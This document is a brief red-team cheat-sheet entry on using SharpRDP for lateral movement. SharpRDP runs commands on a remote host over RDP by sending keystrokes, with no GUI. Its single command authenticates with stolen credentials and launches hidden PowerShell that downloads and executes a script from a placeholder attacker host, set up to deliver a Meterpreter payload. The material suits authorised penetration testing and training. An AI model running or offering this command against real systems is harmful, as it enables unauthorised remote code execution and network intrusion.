# 08.08 SharpRDP Command-Line RDP Execution

> Section 9.1.4 · Execute commands over RDP without GUI

## Overview

SharpRDP uses the non-scriptable COM interfaces exposed by mstscax.dll (the same DLL mstsc.exe uses) to authenticate and execute commands via SendKeys — no GUI window needed, no reverse tunnel required. Useful for lateral movement when you have credentials but RDP is only accessible on the local network.

## Steps

- **Transfer SharpRDP** to the machine with network access to the target.
- **Execute command** — SharpRDP authenticates and sends keystrokes to open cmd/PS on the target.
- **Chain a download cradle** — use SharpRDP to run a PowerShell download cradle for a Meterpreter payload.

## Commands

### SharpRDP execution

```cmd
SharpRDP.exe computername=<TARGET> username=<USER> password=<PASS> \
  command="powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')"
```
